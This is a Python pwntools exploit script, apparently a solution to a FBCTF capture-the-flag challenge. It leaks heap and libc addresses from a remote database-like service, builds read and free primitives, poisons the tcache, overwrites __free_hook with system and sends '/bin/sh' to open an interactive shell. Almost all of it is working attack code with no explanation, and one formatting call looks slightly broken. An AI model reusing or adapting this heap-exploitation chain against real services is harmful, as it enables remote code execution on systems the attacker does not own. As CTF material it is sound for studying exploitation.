from pwn import *
from subprocess import check_output
from heaputils import get_PIE

def cmd(cmd_str):
    p.recvuntil(">>>")
    p.sendline(cmd_str)

def pack(num):
    return check_output(["./pack",str(num)]).strip()

if __name__ == "__main__":
    libc = ELF("./libc-2.27.so")
    p = remote("challenges.fbctf.com", 1337)

    # used for addrof primitive
    cmd("create normaldb")

    cmd("create leaker")
    cmd("store leaker int 0 0")

    # used for arbitrary read
    cmd("create reader")
    cmd("store reader string 0 ABCDEFGH")

    # used for arbitrary pointer freeing
    cmd("create freer")
    cmd("store freer string 0 12345678")

    # heap leak
    cmd("store leaker string 0 {}".format("X"*0x100))
    cmd("echo EOF")
    p.recvuntil("EOF")
    cmd("get leaker 0")
    HEAP = int(p.recvline())
    log.info("HEAP: 0x%x"%HEAP)

    # libc leak
    cmd("store freer float 0 {}".format(pack(HEAP)))
    cmd("store normaldb string 0 {}".format("this_is_my_string".ljust(0x400,"P")))
    cmd("remove normaldb 0")
    libc_ptr_storage = HEAP + 0x5640469d11d0 - 0x5640469d0060
    cmd("store reader float 0 {}".format(pack(libc_ptr_storage)))
    cmd("get reader 0")
    data = p.recvline().strip()
    LIBC = u64(data.ljust(8,"\x00")) + 0x7f8f4fadf000 - 0x7f8f4fecaca0
    log.info("LIBC: 0x%x"%LIBC)

    oneshot = LIBC + libc.symbols['gets']

    # use leaker to get vtable address
    oneshot_storage = HEAP + 0x558abf3b1168 - 0x558abf3affd0
    oneshot_storage_storage = HEAP + 0x55b6c50961a8 - 0x55b6c5094fd0
    cmd("store normaldb float 1337 {}".format(pack(oneshot)))
    cmd("store normaldb float 1234 {}".format(pack(oneshot_storage)))

    cmd("create db") 

    cmd("store db int 1 1337")
    cmd("getter db 1 2")
    p.sendline("echo db".format("A"*0x10+p64(oneshot_storage_storage).strip("\x00")))
    p.sendline("empty")
  
    cmd("store db int 1 1337")
    cmd("delete normaldb 1234")
    p.sendline("print db")
    # now using gets we can overwrite the next tcache entry
    free_hook = LIBC + libc.symbols['__free_hook']
    system = LIBC + libc.symbols['system']
    p.sendline("A"*0x18+p64(free_hook))
    cmd(p64(system)+p64(0xdddddddd))

    p.sendline("/bin/sh;                                           ")

    p.interactive()